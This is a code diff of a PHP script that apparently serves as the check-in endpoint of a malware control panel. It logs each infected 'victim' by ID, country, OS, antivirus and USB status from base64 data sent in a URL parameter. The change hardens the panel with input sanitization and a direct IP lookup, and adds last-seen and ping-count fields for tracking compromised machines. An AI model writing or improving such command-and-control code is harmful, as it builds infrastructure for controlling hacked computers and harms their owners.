@@ -4,10 +4,10 @@ include_once 'classes/Clients.php';
 
 $client = new Clients;
 
-$ipaddress = getUserIpAddr();
+$ipaddress = $_SERVER['REMOTE_ADDR'];
 $country = getConteryCode($ipaddress);
 $date = date("Y-m-d");
-$data = isset($_GET['data']) ? explode("|BN|", base64_decode($_GET['data'])) : '';
+$data = isset($_GET['data']) ? explode("|BN|", sanitizeInput(base64_decode($_GET['data']))) : '';
 
 $clientdata = [
 'vicid'=>$data[0],
@@ -16,6 +16,8 @@ $clientdata = [
 'cont'=>$country,
 'os'=>$data[2],
 'insdate'=>$date,
+'update_at'=>date("m/d/Y H:i:s",time()),
+'pings'=>0,
 'av'=>$data[3],
 'stats'=>$data[4],
 'usb'=>$data[5],
@@ -48,17 +50,12 @@ function new_dir($victimID){
 
 }
 
-function getUserIpAddr(){
-    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
-        //ip from share internet
-        $ip = $_SERVER['HTTP_CLIENT_IP'];
-    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
-        //ip pass from proxy
-        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    }else{
-        $ip = $_SERVER['REMOTE_ADDR'];
-    }
-    return $ip;
+function sanitizeInput($value){
+   $data = trim($value);
+   $data = strip_tags($data);
+   $data = htmlentities($data);
+   $data = htmlspecialchars($data,ENT_QUOTES,'UTF-8');
+   $data = filter_var($data,FILTER_SANITIZE_STRING);
+   return $data;
 }
-
 ?>
